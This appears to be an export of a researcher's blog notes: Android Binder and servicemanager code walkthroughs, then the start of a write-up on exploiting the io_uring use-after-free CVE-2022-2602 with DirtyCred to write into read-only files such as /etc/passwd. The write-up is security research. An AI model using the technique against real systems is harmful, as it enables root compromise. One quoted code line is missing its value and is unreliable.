BR_TRANSACTION\nFollowing the service manager source code we can encounter and deepen some essentials structures such as the `binder_transaction_data` that is casted from `bwr.read_buffer` (now referenced in the local function as `ptr`) + `sizeof(uint32_t)`, because the first 32 bits are meant for the command constant.\n\n```cpp \nstruct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;\n```\n\n![img3](/notes/images/android/2/3.png)\n\nThis is the `binder_transaction_data` structure:\n\n```cpp\n\n//https://android.googlesource.com/kernel/msm/+/android-6.0.1_r0.74/drivers/staging/android/uapi/binder.h\nstruct binder_transaction_data {\n  /* The first two are only used for bcTRANSACTION and brTRANSACTION,\n   * identifying the target and contents of the transaction.\n   */\n  union {\n    __u32 handle; /* target descriptor of command transaction */\n    binder_uintptr_t ptr; /* target descriptor of return transaction */\n                // in BR_TRANSACTION this must be BINDER_SERVICE_MANAGER or the service_manager return -1\n  } target;\n  binder_uintptr_t  cookie; /* target object cookie */\n  __u32   code;   /* transaction command. */ // e.g. SVC_MGR_GET_SERVICE\n  /* General information about the transaction. */\n  __u32         flags;\n  pid_t   sender_pid;\n  uid_t   sender_euid;\n  binder_size_t data_size;  /* number of bytes of data */\n  binder_size_t offsets_size; /* number of bytes of offsets */\n  /* If this transaction is inline, the data immediately\n   * follows here; otherwise, it ends with a pointer to\n   * the data buffer.\n   */\n  union {\n    struct {\n      /* transaction data */\n      binder_uintptr_t  buffer;\n      /* offsets from buffer to flat_binder_object structs */\n      binder_uintptr_t  offsets;\n    } ptr;\n    __u8  buf[8];\n  } data;\n};\n\n```\n\nThis structure contains necessary information about the incoming request, such as the sender `PID` and `UID` to check permissions for a service, the target descriptor (`handle`) and the transaction command (`code`) for the service manager (for example `PING_TRANSACTION` or `SVC_MGR_CHECK_SERVICE`).\n\nThis `binder_transaction_data` structure initializes a new `binder_io` (binder I/O) structure using `bio_init_from_txn()`, that will copy data and offsets from `binder_transaction_data` to this new one.\n\n```cpp\nstruct binder_io\n{\n    char *data;            /* pointer to read/write from */\n    binder_size_t *offs;   /* array of offsets */\n    size_t data_avail;     /* bytes available in data buffer */\n    size_t offs_avail;     /* entries available in offsets array */\n\n    char *data0;           /* start of data buffer */\n    binder_size_t *offs0;  /* start of offsets buffer */\n    uint32_t flags;\n    uint32_t unused;\n};\n```\n\n![img4](/notes/images/android/2/4.png)\n\n`bio_*` functions refers to operations on the `binder_io` structure, here is an example on how the that structure is filled from `binder_transaction_data`:\n\n```cpp\nvoid bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)\n{\n    bio-\u003edata = bio-\u003edata0 = (char *)(intptr_t)txn-\u003edata.ptr.buffer;\n    bio-\u003eoffs = bio-\u003eoffs0 = (binder_size_t *)(intptr_t)txn-\u003edata.ptr.offsets;\n    bio-\u003edata_avail = txn-\u003edata_size;\n    bio-\u003eoffs_avail = txn-\u003eoffsets_size / sizeof(size_t);\n    bio-\u003eflags = BIO_F_SHARED;\n}\n```\n\nAs we can see, `buffer` and `offsets` (including their size) of `binder_transaction_data` are filled in their relative `binder_io` structure, and both structures are passed over the service manager callback function (the `svcmgr_handler` function defined in `service_manager.c` while calling `binder_loop`):\n\n```cpp\nres = func(bs, txn, \u0026msg, reply);\n  // func  -\u003e binder_handle defined in service_manager.c - binder_loop(bs, svcmgr_handler);\n  // bs    -\u003e binder_state\n  // txn   -\u003e binder_transaction_data\n  // msg   -\u003e binder_io initialized from binder_transaction_data\n  // reply -\u003e an empty binder_io that will contain the reply from the service manager\n```\n\nNow, the `BR_TRANSACTION` is inside the `svcmgr_handler`.\n\nThe `binder_transaction_data.ptr` must contain `BINDER_SERVICE_MANAGER` in order to continue (otherwise it returns `-1`) and `binder_transaction_data.code` contains the service manager command. These service commands (dispatched in a switch condition) can be:\n- `PING_TRANSACTION`: It is a ping to the servicemanager and returns 0.\n- `SVC_MGR_GET_SERVICE` - `SVC_MGR_CHECK_SERVICE`: Get a handle to a service. They follow the same switch path.\n- `SVC_MGR_ADD_SERVICE`: Add a new service\n- `SVC_MGR_LIST_SERVICES`: List all available services\n\nLet's start to dig into `SVC_MGR_GET_SERVICE`.\n\n### SVC_MGR_GET_SERVICE\n\nThis service command occurs when the binder needs a service handle based on a service name (requested from a client).\n\nThe service name is taken from the `binder_io` structure (referred as `msg` in the source code) using `bio_get_string16`. \n\nWe have different functions in the format of `bio_get_*` (`bio_get_uint32`, `bio_get_string16`, `bio_get_obj`, `bio_get_ref`) and they are all primitives of `bio_get()` that retrieves the requested data type from `(binder_io*) bio-\u003edata`. The same for `bio_put_*` functions in order to insert data in a `binder_io` structure while replying to a command.\n\n`do_find_service()` is called with the service name and the caller `UID` and `PID` from the `binder_transaction_data` structure and immediately calls `find_svc()` that will iterate its service single linked list and return an `svcinfo` structure if match the requested service name:\n\n```cpp\n{\n    struct svcinfo *next; // pointer to the next service\n    uint32_t handle;\n    struct binder_death death;\n    int allow_isolated;\n    uint32_t dumpsys_priority;\n    size_t len;\n    uint16_t name[0];\n} svcinfo;\n```\n\n![img6](/notes/images/android/2/5.png)\n\nThe `svcinfo` structure mainly contains information about the target service.\n\nIf the service matches the `svcinfo.name` item, the structure is returned to the `do_find_service` function that is responsible to perform extra checks.\n\nThe first check is about process isolation. As we were talking in the first part of this series, some services are not allowed to be called from isolated apps (such as web browsers):\n\n```cpp\n  if (!si-\u003eallow_isolated) {\n        uid_t appid = uid % AID_USER;\n        if (appid \u003e= AID_ISOLATED_START \u0026\u0026 appid \u003c= AID_ISOLATED_END) {\n            return 0;\n        }\n    }\n```\n\nIn this piece of code, the UID retrieved from `binder_transaction_data` struct (coming from the binder) is verified against the range between `AID_ISOLATED_START` and `AID_ISOLATED_END`. These UIDs (a range from 99000 to 99999) are associated with isolated processes and they can interact only with services with `svcinfo.allow_isolated` set to `true`.\n\nIf this check is passed, a selinux permission checks if the sender is allowed to retrieve the service and the handler is returned to the main switch case in the service handler. The returned handle will be put inside the `binder_io` reply using `bio_put_ref()` and returns 0, meaning everything was fine. Later on we will see how the message is sent back to the binder.\n\n### SVC_MGR_LIST_SERVICES\nWe can also list available services with the `SVC_MGR_LIST_SERVICES` command, that will iterate through the service list (`svclist`) and put the result in the `binder_io` reply message using `bio_put_string16`. There is also an interesting condition on `dumpsys_priority`. The priority, that can be defined while registering a new service, can be of three levels: CRITICAL, HIGH and NORMAL. While listing all services, we can choose to dump only services with a specific priority (specified in the `svclist` structure). \n\nFor example, using the `dumpsys` utility in Android, we can specify the desired level:\n\n```bash\nadb \u003e dumpsys -l --priority CRITICAL\nCurrently running services:\n  SurfaceFlinger\n  activity\n  cpuinfo\n  input\n  notification\n  window\n\ndumpsys -l --priority HIGH\nCurrently running services:\n  connectivity\n  meminfo\n\nadb \u003e dumpsys -l --priority NORMAL\nCurrently running services:\n  activity\n  connectivity\n  notification\n```\n\n### SVC_MGR_ADD_SERVICE\n\nIf the requested command from the binder is `SVC_MGR_ADD_SERVICE`, the binder is proxying a client request to register a new service. Details about the new service are taken from the `binder_io` message (`binder_io-\u003edata`). Service attributes are the service name, the priority level (`dumpsys_priority`), the handle and if it is permitted to interact with the service from isolated apps (`allow_isolation`). The function `do_add_service()` is called with these information and the caller UID and PID from the `binder_transaction_data` message.\n\nThis function is responsible to check for caller permissions (the process that requests the registration), starting by checking its UID to avoid the creation of a new service from standard applications. This is accomplished by checking if the `AID_APP` is over 10000.\n\nIn Android, installed applications start from UID 10000, so the condition is aimed to prevent an user application from installing a new service (or override an existing one). That also means that the privileged *system* user (with UID 1000) can register a new service. \n\nIf this condition is satisfied, a selinux check controls that the caller process has `add` permissions. If the caller process has rights to register a new service, `find_svc()` checks if the service name has been already registered. If it already exists, the service handle is overridden with the new one and `svcinfo_death()` called. \n\nBefore going in depth with this function behaviour, let's introduce the scenario where the service does not exist:\n\n```cpp\nstruct svcinfo *si;\n    /../\n      si-\u003ehandle = handle;\n        si-\u003elen = len;\n        memcpy(si-\u003ename, s, (len + 1) * sizeof(uint16_t));\n        si-\u003ename[len] = '\\0';\n        si-\u003edeath.func = (void*) svcinfo_death;\n        si-\u003edeath.ptr = si;\n        si-\u003eallow_isolated = allow_isolated;\n        si-\u003edumpsys_priority = dumpsys_priority;\n        si-\u003enext = svclist;\n        svclist = si;\n        /../\n\n```\n\n\n![img6](/notes/images/android/2/6.png)\n\nThe code is pretty self-explanatory, it is populating the new structure with input values and updates its service list with `si-\u003enext = svclist` and `svclist = si` (linked list behavior). And here, we are back with the death that we were talking some lines above.\n\nThe `binder_death` structure, part of the `svclist`, contains two items, `func` and `ptr`. The `ptr` is a pointer to its service structure (itself), and the `func` is a function pointer pointing to `svcinfo_death()`. \n\nThis death function sets the service handle to 0 and informs the binder that the service is dead using a `BC_RELEASE` with the service handle as parameter, so the binder can release this reference. The binder can use this information to also inform associated clients that the service is down using `BR_BINDER_DOWN` if clients requested for it (by sending to the binder a `BC_REQUEST_DEATH_NOTIFICATION` for that service). \n\nOn the other side, when a service is registered or overridden, a `BC_ACQUIRE` with the service handle as parameter is sent to the binder, also with the `BC_REQUEST_DEATH_NOTIFICATION` in case the service goes down (for example if its crashes).\n\n### Comeback to the service handler\nWhen one of these described commands are executed, the Binder usually expects a reply back. While handling commands, `SVC_MGR_ADD_SERVICE` puts 0 in reply message if success (`bio_put_uint32(reply, 0);`) or simply return `-1` if something fails and the binder will receive an empty reply (that was previously initialized using `bio_init()`).\n\n`SVC_MGR_GET_SERVICE` and `SVC_MGR_LIST_SERVICES` act in the same way if something goes wrong (`-1` and empty reply packet) or they return 0 to the function after have filled the reply packet with necessary values (the handle in case of the get service and a list of services in case of a service list command).\n\nWhen the service handler returns, the execution flow comes back inside the `binder_parse` function (in the `BR_TRANSACTION` switch case) with the reply packet and the result value of the servicemanager handler. Based on the `binder_transaction_data.flags`, if `TF_ONE_WAY` is set it means that is an asynchronous call and the binder does not expect a reply, so the servicemanager will inform the binder to free the `binder_transaction_data.ptr.buffer` with a `BC_FREE_BUFFER` command (internally using the `binder_free_buffer` function). If it's not an asynchronous call, it will send the reply back to the binder using `binder_send_reply()` that will send a `BC_REPLY` command.\n\nAlso, as you could notice, all these functions (`binder_send_reply`, `binder_free_buffer`, ..) are meant to be easily called inside the source code, and will perform all setup operations to interact with the binder with the final `ioctl` operation. Let's take a simple example of the `binder_free_buffer` mentioned before.\n\n```cpp\nvoid binder_free_buffer(struct binder_state *bs,\n                        binder_uintptr_t buffer_to_free)\n{\n    struct {\n        uint32_t cmd_free;\n        binder_uintptr_t buffer;\n    } __attribute__((packed)) data;\n\n    data.cmd_free = BC_FREE_BUFFER;\n    data.buffer = buffer_to_free;\n    binder_write(bs, \u0026data, sizeof(data));\n}\n```\n\nThis function, previously used by the service manager handler to inform the binder to free a buffer, will setup, using a `data` structure, a `cmd_free` with `BC_FREE_BUFFER` on it and the buffer to free, then call `binder_write`. `binder_write` is the final function that will put received input inside a `binder_write_read.write_buffer` structure before performing the `ioctl` to the binder with the `BINDER_WRITE_READ` command:\n\n```cpp\nint binder_write(struct binder_state *bs, void *data, size_t len)\n{\n    struct binder_write_read bwr;\n    int res;\n\n    bwr.write_size = len;\n    bwr.write_consumed = 0;\n    bwr.write_buffer = (uintptr_t) data;\n    bwr.read_size = 0;\n    bwr.read_consumed = 0;\n    bwr.read_buffer = 0;\n    res = ioctl(bs-\u003efd, BINDER_WRITE_READ, \u0026bwr);\n    if (res \u003c 0) {\n        fprintf(stderr,\"binder_write: ioctl failed (%s)\\n\",\n                strerror(errno));\n    }\n    return res;\n}\n```\n\nWe can note the differences on the usage of the `binder_write_read` structure now and before. When we were expecting an action from the binder (in the `binder_loop`) the received action was inside the `read_buffer` (that contains the `BR_*` command). Now, the binder needs to perform actions based on our input, so we are using the `write_buffer` (with a `BC_*` command).\n\nSaid that, we can come back inside the `binder_send_reply` that is responsible to send the reply of performed actions to the binder. This is the source code:\n\n```cpp\n\nvoid binder_send_reply(struct binder_state *bs,\n                       struct binder_io *reply,\n                       binder_uintptr_t buffer_to_free,\n                       int status)\n{\n    struct {\n        uint32_t cmd_free;\n        binder_uintptr_t buffer;\n        uint32_t cmd_reply;\n        struct binder_transaction_data txn;\n    } __attribute__((packed)) data;\n\n    data.cmd_free = BC_FREE_BUFFER;\n    data.buffer = buffer_to_free;\n    data.cmd_reply = BC_REPLY;\n    data.txn.target.ptr = 0;\n    data.txn.cookie = 0;\n    data.txn.code = 0;\n    if (status) {\n\t    // the svcmgr_handler return -1\n\t\tdata.txn.flags = ;\n\t\tdata.txn.data_size = sizeof(int);\n\t\tdata.txn.offsets_size = 0;\n\t\tdata.txn.data.ptr.buffer = (uintptr_t)\u0026status;\n\t\tdata.txn.data.ptr.offsets = 0;\n    } else {\n        // the svcmgr_handler return 0\n        data.txn.flags = 0;\n        data.txn.data_size = reply-\u003edata - reply-\u003edata0;\n        data.txn.offsets_size = ((char*) reply-\u003eoffs) - ((char*) reply-\u003eoffs0);\n        data.txn.data.ptr.buffer = (uintptr_t)reply-\u003edata0;\n        data.txn.data.ptr.offsets = (uintptr_t)reply-\u003eoffs0;\n    }\n    binder_write(bs, \u0026data, sizeof(data));\n}\n\n```\n\nNote the declared `data` structure, it contains an integer `cmd_free` (that will be `BC_FREE_BUFFER`), the `buffer`, the `cmd_reply` (that will be `BC_REPLY`) and a `binder_transaction_data` structure. \n\nThe buffer to free is `binder_transaction_data.data.ptr.buffer` (previously casted in `binder_io` and contains parameters like the service name for the servicemanager) and then the structure is filled based on the `status` value. \n\nThe `status` value is the return value from the servicemanager handler (`svcmgr_handler`) that can be 0 if everything was fine (and the reply was filled) or `-1` if something went wrong. \nIf the result is `-1` it is copied inside the `data.txn.data.ptr.buffer` (so inside the `binder_transaction_data` of the data structure). \n\nIf the result of the service manager handler was fine (0), the `binder_transaction_data` is filled with reply's data/offsets buffers and passed over the `binder_write` function, that, as explained before, will take the data structure and put it in `binder_write_read.write_buffer` before calling `ioctl` with the `BINDER_WRITE_READ` command.\n\n## Little resume\nThe servicemanager is started by the init process (as defined in `/init.rc`) and first of all it becomes the context manager for the binder. Then he notices the binder that will enter an infinite loop (`BC_ENTER_LOOPER`) and starts to read and parse operations delivered from the binder. When such events are related to service lookup or service registration (`SVC_MGR_GET_SERVICE` and `SVC_MGR_ADD_SERVICE`) the binder requests the servicemanager for a `BR_TRANSACTION` with one of these commands inside its `binder_transaction_data` structure. The servicemanager checks for necessary rights on the caller process (information sent from the binder) and, in case of a service lookup, returns a handle to the binder. When it's done, the reply is sent to the binder using `ioctl` with `BINDER_WRITE_READ` with the reply inside the `write_buffer` and the `BC_REPLY` command.\n\n## Conclusions\nIn this post, we concentrated on transactions between the Binder and the servicemanager, a crucial component for IPC.","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/Android-Internals-IPC-Introduction":{"title":"Android Internals IPC: Introduction","content":"\n## Introduction\nIn the last few months I was studying Android Internals in order to perform some security research in the future. I first tried to focus myself in its architecture and fundamentals components, starting from the bootloader stage to the Framework, in order to have an initial high level picture. Then, I focused on the Binder component for two reasons:\n- It is one of the main Android components, vital for its functionalities, as it is the IPC core.\n- In that period Google P0 discovered a 0day in the wild used in a chain to compromise the Android System. The Binder was impacted allowing LPE as root also from an isolated process (that means it is for sure a good attack vector)\n\n\nDuring this studying process, I took a lot of messy notes, so after 1/2 months of not working anymore on Android, I took them back, put them in order, studied again (adding more messy notes) and decided to write this little series of articles. So, especially the second and the third sections contain theory concepts, high level functionalities and a lot of source code references. Parts of these articles can be considered as a â€˜Code Walkthroughâ€™, so having the actual Android Source Code (the online Android repository is enough) is highly suggested to understand the flow.\nI didnâ€™t want to repost other people's work, so this â€˜code walkthroughâ€™ is something different that honestly could help me when I was starting on it, so I hope it can help others too. It could not be perfect, so feel free to appoints something at \u003calessandro [at] hacktivesecurity.com\u003e and I will of course consider them.\nBy the way, all references are at the bottom of each article.\n\nIn this first section, I will introduce some basic Android concepts that will be useful for next chapters. The second will deepen Binder interactions and the servicemanager. And last, but not least, the client and service IPC implementation and usage.\n\n## IPC Introduction\nInter-Process Communication is a necessary and indispensable feature for every Operating System in order to let processes communicate with each other. That means, if Process A needs to communicate with Process B (synchronize, share data, .. ), the OS must provide capabilities to do that.\nWe have multiple and different solutions that we can apply depending on the underlying OS, they can be through Pipes, Sockets, Shared Files, Shared Memory and more. These implementations are out of scope of this articleâ€™s series, so these are well-written reference:\n\n- Linux: [https://www.geeksforgeeks.org/inter-process-communication-ipc/](https://www.geeksforgeeks.org/inter-process-communication-ipc/)\n- OSX: [https://developer.apple.com/documentation/uikit/inter-process_communication](https://developer.apple.com/documentation/uikit/inter-process_communication)\n- Windows: [https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications](https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications)\n\nIn order to go over the IPC implementation in Android, letâ€™s make a short introduction to Android functionalities and some security aspects that will be useful during the reading.\n\n## Android and Linux\nStarting from the classic. Android is a Linux kernel based distribution aimed for mobile devices. I cannot explain better than how was explained in *â€˜Android Internalsâ€™* by â€˜Jonathan Levinâ€™:\n\n*â€œAndroid's novelty arises from what it aims to provide -**not just another Linux distribution** - but a full software stack. The term \"stack\" implies several layers. **Android provides not just the basic kernel and shell binaries, but also a self-contained GUI environment, and a rich set of frameworks**. Coupled with a simple to use development language - Java - Android gives developers a true **Rapid Application Development (RAD) environment**, as they can draw on prewritten, well-tested code in the frameworks to access advanced functionality - such as Cameras, motion sensors, GUI Widgets and more - in a few lines of codeâ€*\n\nOne of the biggest differences with Linux is **Bionic** has its core runtime C library, instead of the standard GNU libC (Glibc). Bionic is lighter and more focused on Androidâ€™s needs. There are a lot of changes between them. Today we are focused on IPC, so the difference in our interest is the omission of the System-V IPC (message queues, shared memory and semaphores), that are omitted because Android chooses its own IPC mechanism, the **Binder**. The Binder is a kernel component, the core component of IPC, that enables different processes to communicate with each other using a client-server architecture. Itâ€™s the core theme of this series, so we will deppen in later chapters.\n\n## Dalvik and ART\nJust to be aligned, letâ€™s spend some words about the Dalvik Virtual Machine and ART, which are the core of Android.\nIf you know how Java works, you also know that in order to execute the code you need the JVM (**J**ava **V**irtual **M**achine) that will execute the compiled bytecode, translating it to machine code.\nWell, Dalvik follows the same concept, but itâ€™s not the same!\nThe Dalvik VM runs a different type of bytecode, called DEX (**D**alvik **E**xecutable) that is more optimized for efficiency in order to run faster on low performance hardware as it is for mobile devices. It is a Just In Time (JIT) compiler, that means that the code is compiled dynamically when it needs to be executed.\n**A**ndroid **R**un**T**ime (ART) is used for the same purpose: translate bytecode to machine code and execute it.\nBy the way, it uses a different approach instead of JIT compiling , it uses **A**head **O**f **T**ime (AOT) that translates the whole DEX into machine code (dex2oat) at installation time when the APK is installed or when the device is idle. That means that is much more faster at execution time, but also requires more physical space.\n\nDalvik is the predecessor of ART. ART has been introduced in Android 4.4 (KitKat) and started to use hybrid combination of AOT and JIT from Android 7.0 (Nougat), starting to follows a different compilation approach, synthesizing:\n\n- The first few times the application runs, the app is executed through JIT compilation.\n- When the device is idle or charging, a daemon performs compilation using AOT on frequently used code, based on a profile compilation generated from the first run\n\nYou can find these profiles for each installed application inside */data/dalvik-cache/profiles/*:\n\n![img1](/notes/images/android/1/1.png)\n\n## Android Framework and abstraction\nDevelopers can access complex functionalities with few lines of code using pre-written code that resides in the Framework, delivered in packages that start with com.android.\\* . These packages can be for different scopes, such as location and application support (*android.location* and *android.app*) Network (*android.net*) and in our interest, IPC support and core OS services from android.os. ([developer.android.com/packages](https://developer.android.com/reference/packages.html) for more).\nThis is a high advantage from the Security Perspective. Usually, developers do not have to bother with native languages (avoiding common memory corruption issues) and instead use a well tested code, also when they need to perform advanced or low level functionalities (such as access an hardware peripheral) they can stay in an High Level, Memory Safe language.\n\nLetâ€™s take a quick example on how to interact with the WiFi component, supposing we need to retrieve the actual WiFi state:\n\n```\nimport android.net.Wifi \n// Get an handle to the WiFi Service\n[..]\nWifiManager Wifi_manager = (WifiManager) GetApplicationContext().getSystemService(Context.WIFI_SERVICE);\n// Get the WifiState\nWifi_manager.getWifiState();\n[...]\n```\n\nWith these 2 lines of code we have completed our task:\n- Get a handle to the WiFi service. The return result of getSystemService() is a generic Object (the handle to the service) that needs to be casted based on the desired service.\n- From the retrieved manager, we can directly call the desired function, that will perform an IPC and return the result back.\n\nThatâ€™s how Android abstract service interactions, enhancing security by simplifying applicationâ€™s code.\n\nBy the way sometimes, due to performance reasons too, there is the necessity to run native code inside an application. This is performed using JNI, that permits to call native functions inside a shared library in the application context. This is pretty common for messaging applications (for example, whatsapp uses [PJSP](https://www.pjsip.org/), a C library, for video conferences).\n\n## Java Native Interface\nAs we said, sometimes there is the necessity to use native code such as C/C++ from standard applications. This is permitted using the JNI (Java Native Interface) that lets Java call native functions without drastic differences. The native code is exported in shared libraries inside the lib/ folder (of the APK) where we have binaries compiled for multiple architectures (32/64 bit ARM, x86/x86-64 ), and the the underline system will choose the appropriate one (based on its hardware).\nLetâ€™s take an example with Whatsapp:\n\n![img2](/notes/images/android/1/2.png)\n\nIn this case, inside the lib/ folder there is only the armeabi-v7a folder. Thatâ€™s because my test device is a 32 bit ARM (https://developer.android.com/ndk/guides/abis) and the system optimized physical space removing unused binaries compiled for other platforms.\nThese native functions are interesting from a security perspective because they can include **memory corruption issues**.\nIn order to track native calls, we can search through the Java code (decompiled) for native declarations:\n\n![img3](/notes/images/android/1/3.png)\n\nThatâ€™s how a native function is declared, with the native keyword, and later on called as it is a normal Java function.\nIf you want to extract exported symbols from shared libraries, the nm utility can be come handy (*nm -D * | grep \\\u003cfunc_name\\\u003e* inside the specific ABI folder can be enough).\n\nIf you find an exploitable memory corruption in one application, you also have to consider the application sandbox. If you successfully compromise an application through a remote code execution, you are closed in a sandbox, where you can interact only with applicationâ€™s related files and functionalities (and its declared android permissions). Of course, this can be part of a chain, with a foothold inside the system you have more attack surface in order to elevate privileges and compromise the system.\n\n## Application Sanbox\nCVE-2019-11932 is a Whatsapp Remote Code execution caused by a memory corruption while handling GIF animations ([here is a demo POC](https://www.youtube.com/watch?v=loCq8OTZEGI)). This was a critical issue because, also if you are in a sandbox, you can access all whatsapp files (chat databases, backup, media , ..) and, as we know, nowadays whatsapp is the main messaging application.\nAs we said, Android is a Linux based OS and inherits a lot of its concepts. In this way, Android uses kernel-level Application Sandbox using the UID (Unique User ID). Every application on Android has its own UID and GUID for file permissions and running application process (UID starts from 1000). All applications have a dedicated workspace in */data/data/\\\u003capp_name\\\u003e* created at the installation time where permissions permits only the application user to read and write in these files:\n\n![img4](/notes/images/android/1/4.png)\n\nAs you can see, only the user u0_a106 (10106, the UID for the WhatsApp application in my Droid) can access these files, meaning that any other application cannot read its content (only him and the root user).\nFor some applications (like browsers) there is an additional isolation that literally â€˜isolatesâ€™ the application using a different UID. These IDs are referred in the Kernel source code as AID_ISOLATED_START (which is 99000) and AID_ISOLATED_END (99999) and limit service interactions. For example, the following snippet is part of the Android Kernel in order to obtain an handle to a service:\n\n\n```\nuint32_t do_find_service(const uint16_t *s, size_t len, uid_t uid, pid_t spid)\n{\n   //find_svc will retrieve a service info structure\n   struct svcinfo *si = find_svc(s, len);\n/.../\n   //check if the requested service allow interaction from isolated apps\n   if (!si-\u003eallow_isolated) {\n       // If this service doesn't allow access from isolated processes,\n       // then check the uid to see if it is isolated.\n       uid_t appid = uid % AID_USER;\n       if (appid \u003e= AID_ISOLATED_START \u0026\u0026 appid \u003c= AID_ISOLATED_END) {\n           return 0;\n       }\n   }\n/../\nreturn si-\u003ehandle\n\n```\n\nWe will deepin in next chapters about the full process to obtain a service handle, but from this snippet you can see where the isolation check is performed. A check is done in the svcinfo structure (structure with service information such as the name, the isolation level and more) and if the target service is not allowed to be called from isolated processes (the caller UID is between AID_ISOLATED_START and AID_ISOLATED_END) the service handle is not returned.\n\nFor example, this is the chrome browser inside an isolated process:\n\n![img5](/notes/images/android/1/5.png)\n\nYou can note that the user id is 99008 (\u003e99000), meaning it is an isolated application process.\n\n## Conclusion\nIn this first article, we introduced basic Android concepts and security aspects that will become handy for next chapters. In the next article, we are going to talk about the Binder, its transactions and the servicemanager.\n\n## References\n[http://newandroidbook.com/](http://newandroidbook.com/)\n[https://source.android.com/devices/tech/dalvik](https://source.android.com/devices/tech/dalvik)\u003c\n[https://source.android.com/security/app-sandbox](https://source.android.com/security/app-sandbox)","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/DirtyCred-File-Exploitation-applied-on-an-io_uring-UAF-CVE-2022-2602":{"title":"CVE-2022-2602: DirtyCred File Exploitation applied on an io_uring UAF","content":"\n## Introduction\nIn the past few weeks, I worked with [@LukeGix](https://exploiter.dev) (checkout his blog post on the same vulnerability [here](https://exploiter.dev/blog/2022/CVE-2022-2602.html)) to exploit the CVE-2022-2602, a very interesting bug from multiple perspectives without a public exploit, that impacts the io_uring subsystem with an Use-After-Free vulnerability handling registered file descriptors.\nWe used a Data-Only attack against kernel version 5.15.74 (the latest before the patch) taking inspiration from the DirtyCred technique recently presented at [BlackHat USA](https://zplin.me/papers/DirtyCred.pdf). \n\n## TL;DR\nThe vulnerability is an Use-After-Free that impacts the registered file descriptor functionality in the io_uring subsystem. It's possible to register a file in the io_uring context, free it from the Unix Garbage Collector and re-use it with the requested io_uring operation (for example, a `writev` operation). To exploit the bug, it was a matter of replace the freed file structure with a read-only file (e.g. /etc/passwd), in order to write into it, and achieve a good timing with a small race window.\n\n## Vulnerability\n### Root cause\nThe vulnerability is an Use-After-Free in the io_uring subsystem while handling registered files. The [IORING_REGISTER_FILES](https://manpages.debian.org/unstable/liburing-dev/io_uring_register.2.en.html#IORING_REGISTER_FILES) functionality permits to register file descriptors in the io_uring context so that the consumer (the user-land application) do not have to keep them open. It works by passing the list of file descriptors using the [io_uring_register](https://manpages.debian.org/unstable/liburing-dev/io_uring_register.2.en.html) syscall. However, the Unix Garbage collector (well explained in [this project zero blog post](https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html)), which its entrypoint is the [unix_gc](https://elixir.bootlin.com/linux/v5.15.74/source/net/unix/garbage.c#L205) function and its responsability is to de-allocate in-flight sockets, can free these registered files while io_uring is using them, causing an Use-After-Free vulnerability.\n\nThe vulnerability has been [discovered and described](https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it\u0026utm_medium=twitter) from \"Thadeu Lima de Souza Cascardo\" as following:\n\u003e The vulnerability is a use-after-free that happens when an io_uring request is being processed on a registered file and the Unix GC runs and frees the io_uring fd and all the registered fds. The order at which the Unix GC processes the inflight fds may lead to registered fds be freed before the io_uring is released and has the chance to unregister and wait for such requests to finish.\n\nPutting simple, in order to trigger the vulnerability, we have to register a file descriptor that can be used in an io_uring operation (like a `writev`) using [SQPOLL](https://unixism.net/loti/tutorial/sq_poll.html) and block the write operation using userfault (as demonstrated in the public POC, however we will use something else in our exploit) that will block the kernel thread. Now, close the io_uring context from user-land, triggers `unix_gc` function in some way (that will free the allocated registered file) and resumes the faulted kernel thread by releasing the userfault. In that way, the UAF should be triggered (with KASAN enabled, you can see a bug report).\n\n### Fix\nThe [fix](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0091bfc81741b8d3aeb3b7ab8636f911b2de6e80) commit idea is pretty simple: Leave io_uring alone and let it handle these resources by itself [ignoring its registered files](https://elixir.bootlin.com/linux/latest/source/net/unix/garbage.c#L301). \nSimple and effective.\n\n## Exploitation\n### Exploitation strategies\nThe vulnerability can be approached using different techniques. Since the targeted [struct file](https://elixir.bootlin.com/linux/v5.15.75/source/include/linux/fs.h#L966) is in a dedicated cache (`filp`) a cross cache attack can be a viable approach, since the targeted object has a lot of interesting pointers and behaviours. However, we considered this possibility initially but we thought it would be a lot more reliabale to go with a data only technique. Replace the file struct with one in our control, perform some spray, and it could be possible (since the object is freed). Well, the idea was interesting, but we messed with a lot of things and, also if the exploit turned out quite simple, we put a lot of effort on it.\n\n### DirtyCred: File Exploitation\nThe DirtyCred attack is a technique presented this year at [Black Hat 2022](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf). We are not going to further re-explain it since it has been already documented [in its original paper](https://zplin.me/papers/DirtyCred.pdf), but what is in our intereset is the \"File Exploitation\" part:\n![[notes/images/cve-2022-2602 bh.png|800]] - *Image from [BH slides](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf)*\n\n\nThe idea is pretty simple: If you replace a freed R/W file (while a kernel thread is writing into it) with a read-only file, you can write into that read-only file.\nBut, why and how? Let's start with the why. File permissions are [checked once](https://elixir.bootlin.com/linux/latest/source/fs/read_write.c#L568) before writing with the `write` syscall, once it starts writing (`file-\u003ef_op-\u003ewrite`) no more permissions checks are performed. So, if you are able to replace the `struct file` (retrieved from the `fd` integer number installed for that specific context) with an arbitrary one (e.g. a read-only file) **after** permissions are granted and **before** its write operation, you can write into arbitrary files bypassing permission validations. \nWell, but how? Mainly suspending the kernel execution thread when it starts writing, using [userfault](https://blog.hacktivesecurity.com/index.php/2022/06/13/linux-kernel-exploit-development-1day-case-study/), [FUSE](https://exploiter.dev/blog/2022/FUSE-exploit.html) or abusing file locking (Slow Write).\n\nWe choose to go with the file locking methodology in order to write an universal exploit that does not depend on specific configurations (also FUSE could be a good alternative, since unprivilged userfault has become a standard mitigation).\n\nI would like to tell some observations on this slow write technique, so let's see it from the kernel perspective.\n\n### File locking (Slow Write)\nThe file locking mechanism is a must feature for a kernel: If two concurrency processes are writing into the same file, the kernel must be able to account that and deal with it without loss of integrity. How the kernel does that? Using file locks.\n[Locking](https://en.wikipedia.org/wiki/Lock_(computer_science)) is a synchronization primitive that permits to handle access to the same resource in a multi-thread environment. 